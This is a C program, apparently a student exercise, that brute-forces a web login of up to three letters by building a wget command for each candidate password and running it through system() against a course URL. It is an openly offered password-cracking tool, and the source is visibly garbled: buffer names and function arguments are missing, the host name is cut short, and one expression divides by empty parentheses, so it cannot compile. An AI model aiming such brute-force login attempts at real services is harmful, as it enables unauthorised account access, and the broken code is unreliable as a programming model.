#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#define MINCHAR 65
#define MAXCHAR 122



int  bruteforce_first(int passlen, int *attempts);
int  bruteforce_two(int passlen, int *attempts);
int  bruteforce_three(int passlen, int *attempts);


int main()
{
	int i, wdlen = 1;
	int runtime;
	int counter ;
	int  initTime = 0, exitTime = 0, runTime = 0;

	initTime = time();
	if (bruteforce_first(wdlen, &counter) == 2) {
		wdlen++;
		if (bruteforce_two(wdlen, &counter) == 3) {
			wdlen++;
			if (bruteforce_three(wdlen, &counter) == 0)
				printf("Success In Breaking The  Password");
			else
				printf("Failure !!!!!!");
		}
	} else {
		printf("Success In Breaking The  Password");
	}


	exitTime = time();
	runTime = (exitTime - initTime);

	printf("\nNumber of attempts  is... %d", counter);
	printf("\nTime taken is %lld milli seconds\n", (runTime)/());
	return 0;
}

int bruteforce_first(int passlen, int *attempts)
{
	int i;
	int j = MINCHAR;
	char  *str, *passwd;

	str = (char *) malloc(passlen * sizeof(char));

	for (i = 0; i < passlen; i++) {
		str[i] = MINCHAR;
	}
	str[passlen] = '\0';

	for (i = MINCHAR; i <= MAXCHAR; i++) {
		if (i == 91)
			i = i + 6;
		str[passlen - 1] = i;		
		puts(str);
		(*attempts)++;

		char [100];
		sprintf(, "wget --http-user= --http-passwd=%s	http://sec-crack.cs.rmit.edu./SEC/2/index.php", str);

		if (system() == 0) {
			printf("Password cracked successfully:");
			printf("Password is %s", str);
			return 0;
		}
	}
	return 2;
}

int bruteforce_two(int passlen, int *attempts)
{
	int i;
	int j = MINCHAR;
	char *str, *passwd;

	str = (char *) malloc(passlen * sizeof(char));

	for (i = 0; i < passlen; i++) {
		str[i] = MINCHAR;
	}
	str[passlen] = '\0';


	while (str[0] != MAXCHAR + 1)
		
		{
			for (i = MINCHAR; i <= MAXCHAR; i++) {
				if (i == 91)
					i = i + 6;
				str[passlen - 1] = i;
				(*attempts)++;
				puts(str);

				char [100];
				sprintf(, "wget --http-user= --http-passwd=%s	http://sec-crack.cs.rmit.edu./SEC/2/index.php", str);

				if (system() == 0) {
					printf("Password cracked successfully: ");
					printf("Password is %s", str);
					return 0;
				}
			}

			i = 0;			
			if (str[i] == 'Z') {
				str[i] = 'a';
			} else
				str[i]++;

		}
	return 3;
}


int bruteforce_three(int passlen, int *attempts)
{
	int i;
	int j = MINCHAR;
	char *str, *passwd;


	str = (char *) malloc(passlen * sizeof(char));

	for (i = 0; i < passlen; i++) {
		str[i] = MINCHAR;
	}
	str[passlen] = '\0';

	while (str[0] != MAXCHAR + 1)
		
		{
			for (i = MINCHAR; i <= MAXCHAR; i++) {
				if (i == 91)
					i = i + 6;
				str[passlen - 1] = i;
				(*attempts)++;
				puts(str);
				char [100];
				sprintf(, "wget --http-user= --http-passwd=%s	http://sec-crack.cs.rmit.edu./SEC/2/index.php", str);


				if (system() == 0) {
					printf("Password cracked successfully: ");
					printf("Password is %s", str);
					return 0;
				}
			}

			i = 1;
			while (i <= passlen - 1) {
				if (str[passlen - i - 1] == 'z') {
					str[passlen - i - 1] = MINCHAR;
					str[passlen - 1 - 2]++;
					break;
				} else {
					if (str[passlen - i - 1] == 'Z') {
						str[passlen - i - 1] = 'a';
						break;
					} else {
						str[passlen - i - 1]++;
						break;
					}
				}
				i++;
			}

		}
	return 0;
}
